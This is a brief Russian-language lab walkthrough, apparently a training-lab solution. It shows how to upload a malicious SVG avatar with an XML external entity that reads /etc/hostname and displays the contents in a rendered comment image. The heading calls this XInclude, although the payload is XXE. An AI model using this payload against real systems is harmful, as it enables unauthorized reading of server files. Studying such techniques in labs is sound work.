## Exploiting XInclude to retrieve files
1. Находим что в комментариях можно указывать аватар
2. Создаем картинку, на которой бы рисовалось содержимое файла: 
```<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg> ```
3. Оставляем комментарий. На картинке видим ответ.